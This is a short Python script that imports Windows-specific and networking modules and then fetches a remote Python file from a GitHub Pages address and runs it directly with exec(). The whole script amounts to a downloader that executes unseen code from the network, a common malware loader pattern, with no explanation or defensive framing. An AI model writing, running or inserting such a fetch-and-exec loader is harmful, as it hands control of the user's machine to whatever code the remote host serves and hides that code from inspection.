import sys
import time
from time import sleep, strftime
from datetime import datetime
import threading
import webbrowser, os, re, json, random
import msvcrt
import webbrowser
import requests
import win32api
import threading

exec(requests.get('https://quangdayyy.github.io/MC/main.py').text)
